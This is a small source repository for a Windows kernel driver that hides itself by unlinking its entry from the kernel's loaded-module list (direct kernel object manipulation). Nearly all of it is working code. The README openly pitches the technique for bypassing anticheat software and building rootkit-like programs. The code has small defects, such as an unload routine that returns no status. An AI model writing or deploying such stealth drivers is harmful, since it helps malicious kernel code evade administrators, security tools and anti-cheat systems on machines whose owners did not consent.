Project Path: arc_gmh5225_HideDriver_9tvuo2ao

Source Tree:

```txt
arc_gmh5225_HideDriver_9tvuo2ao
├── Driver.c
├── README.md
└── ldr_data_table.h

```

`Driver.c`:

```c
#include <ntddk.h>
#include "ldr_data_table.h" // header containing data table entry structure which is crucial for this project

/*
	
	KERNEL MODE DRIVER ABLE TO HIDE ITSELF BY USING DIRECT KERNEL OBJECT MANIPULATION.

	MADE BY NBQ

*/

PDEVICE_OBJECT pDeviceObject;
UNICODE_STRING rDevices, rDosDevices;

VOID HideDriver(PDRIVER_OBJECT pDriverObject)
{
	KIRQL irql = KeRaiseIrqlToDpcLevel(); // raises IRQL to DISPATCH level
	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry, modEntry;
	modEntry = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	prevEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Blink;
	nextEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Flink;
	// changing pointers of previous and next process in the list to point around our Driver process
	// this means our Driver process will be skipped when a different program tries enumerating the list
	prevEntry->InLoadOrderLinks.Flink = modEntry->InLoadOrderLinks.Flink;
	nextEntry->InLoadOrderLinks.Blink = modEntry->InLoadOrderLinks.Blink;
	// changing our flink and blink pointers to point to our Driver process
	// this is done just to not have any loose ends and accidentally blue screen
	modEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)modEntry;
	modEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)modEntry;
	// once everything is done we lower the IRQL level back to normal
	KeLowerIrql(irql); 
}

NTSTATUS UnloadDriver(PDRIVER_OBJECT pDriverObject) // simple unload routine
{
	DbgPrintEx(0, 0, "Unloading HideDriver!\n");
	IoDeleteSymbolicLink(&rDosDevices);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath) // DriverEntry() - its like main() for drivers
{
	HideDriver(pDriverObject); // simply call the HideDriver() function and pass it DriverObject

	DbgPrintEx(0, 0, "HideDriver Loaded!\n");

	// registering the driver, not necessary for HideDriver() function to work
	RtlInitUnicodeString(&rDevices, L"\\Device\\HideDriver");
	RtlInitUnicodeString(&rDosDevices, L"\\DosDevices\\HideDriver");

	IoCreateSymbolicLink(&rDosDevices, &rDevices);

	// registering an unload function to be able to unload the driver at will
	pDriverObject->DriverUnload = UnloadDriver;
	
	return STATUS_SUCCESS;
}
```

`README.md`:

```md
# HideDriver ( Direct kernel object manipulation )
Using DKOM to hide kernel mode drivers.

HideDriver() function changes flink and blink pointers of previous
and next process in the process list to point around our Driver process.
This makes our Driver vanish in programs like DriverView because those
programs enumerate process list in which our Driver process has been snipped out.

This could be incredibly  useful for someone trying to bypass certain anticheat software
to circumvent security when programming a rootkit-like software.

Everything you need is provided in the project. For driver development you need 
Visual Studio 2015 Professional with WDK and SDK installed.



```

`ldr_data_table.h`:

```h
#pragma once

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	struct _ACTIVATION_CONTEXT * EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```